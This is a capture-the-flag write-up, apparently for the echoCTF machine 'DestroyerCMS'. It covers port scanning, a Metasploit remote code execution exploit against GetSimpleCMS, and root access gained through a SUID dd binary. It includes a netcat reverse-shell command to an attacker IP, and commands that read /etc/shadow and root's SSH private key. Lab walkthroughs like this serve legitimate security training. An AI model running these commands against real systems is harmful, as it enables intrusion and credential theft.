---
description: >-
  DestroyerCMS echoCTF Machine
title: DestroyerCMS (Intermediate)                # Add title here
date: 2023-01-31 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Destroyercms.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.222    destroyercms.echocity-f.com
```

### Content

-   GetSimpleCMS RCE exploit
-   SUID privilege escalation

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
# Nmap 7.94SVN scan initiated Thu Jan 23 23:31:07 2025 as: nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.222
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.222 ()   Status: Up
Host: 10.0.160.222 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Thu Jan 23 23:34:40 2025 -- 1 IP address (1 host up) scanned in 212.81 seconds
```

Services and Versions running:
```bash
# Nmap 7.94SVN scan initiated Thu Jan 23 23:36:49 2025 as: nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.222
Nmap scan report for 10.0.160.222
Host is up, received user-set (0.17s latency).
Scanned at 2025-01-23 23:36:50 EST for 42s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   256 59:f2:44:81:7e:39:44:a2:74:78:01:f4:41:9d:3c:32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHrsjVfK8kJ4w0XD3dHLYJmvvzVETjkYlbeoYVFk8aHpq9fngAgZvUDDnDekezCzkEP0yYOq4NIP1/mGsLFQ/G4=
|   256 41:6c:06:38:b6:c4:81:32:3a:da:93:34:8e:5e:52:9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcNlnBiNe1SHe160w0K6u9YfowdzTrYEeVIYZHKyZ+7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to GetSimple! - simple
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.61 (Debian)
```

### Exploitation

Checking service HTTP on port 80 I discovered that there is a page that is not shown correctly, so I hover my mouse on top of the "Home" hyperlink to check if there is a host that is not being recognized: 
![](/assets/img/Pasted-image-20250123223859.png)

So, let's add it to the hosts file:
```bash
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.0.160.222    destroyercms.echocity-f.com
```

Finally, I can see the full page with all the visual content:
![](/assets/img/Pasted-image-20250123224310.png)

Searching for this GetSimple CMS I found a public [RCE exploit](https://www.exploit-db.com/exploits/51475) that is easily exploited via metasploit:

![](/assets/img/Pasted-image-20250123224647.png)

After setting all the details, a meterpreter session is opened:

![](/assets/img/Pasted-image-20250123224824.png)

Note.- It is possibl to start a normal shell with command `shell` in meterpreter and using `nc`

```bash
meterpreter > shell
Process 183 created.
Channel 0 created.

nc -c bash 10.10.5.122 2345
```

### Privilege Escalation

By running looking for SUID binaries we identify that there is a SUID binary `dd` that has special privilege flag:
```bash
www-data@destroyercms:/tmp$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/bin/su
/bin/umount
/bin/dd
/bin/mount
```

This binary has an special entry in [GTFObin](https://gtfobins.github.io/gtfobins/dd/) which allows an user to read and write files:

![](/assets/img/Pasted-image-20250123231808.png)

I then proceed to read the `/etc/shadow` file to verify if this is correct, and surprise I can read the file:
```bash
www-data@destroyercms:/tmp$ /bin/dd if=/etc/shadow
root:*:19458:0:99999:7:::
daemon:*:19458:0:99999:7:::
bin:*:19458:0:99999:7:::
sys:*:19458:0:99999:7:::
sync:*:19458:0:99999:7:::
games:*:19458:0:99999:7:::
man:*:19458:0:99999:7:::
lp:*:19458:0:99999:7:::
mail:*:19458:0:99999:7:::
news:*:19458:0:99999:7:::
uucp:*:19458:0:99999:7:::
proxy:*:19458:0:99999:7:::
www-data:*:19458:0:99999:7:::
backup:*:19458:0:99999:7:::
list:*:19458:0:99999:7:::
irc:*:19458:0:99999:7:::
gnats:*:19458:0:99999:7:::
nobody:*:19458:0:99999:7:::
_apt:*:19458:0:99999:7:::
mysql:!:19965:0:99999:7:::
sshd:*:19965:0:99999:7:::
ETSCTF:ETSCTF_<REDACTED>:19965:0:99999:7:::
```

This means that we can read files within /root directory, such as `/root/.ssh/id_rsa`:
```bash
www-data@destroyercms:/tmp$ /bin/dd if=/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<REDACTED>
```

Then we can save this id_rsa private key to access via ssh (don't forget chmod 600):
```bash
└─$ ssh -i id_rsa root@10.0.160.222  
The authenticity of host '10.0.160.222 (10.0.160.222)' can't be established.
ED25519 key fingerprint is SHA256:qPvHgmIzb2YH68N6uMkwoHTkCXjfKLqBYeuEnUc5FZo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
root@destroyercms:~#
```

### Post Exploitation
Finally, read the flag on /root directory:
```bash
root@destroyercms:~# ls
ETSCTF_<REDACTED>
```

### Credentials
Find id_rsa using dd binary with SUID


### Notes

-   Always look for public exploits on CMS specially those that are verified and have metasploit PoC
-   Look for SUID binaries, privilege escalation simple commands are key (if not, use linpeas.sh)

### References



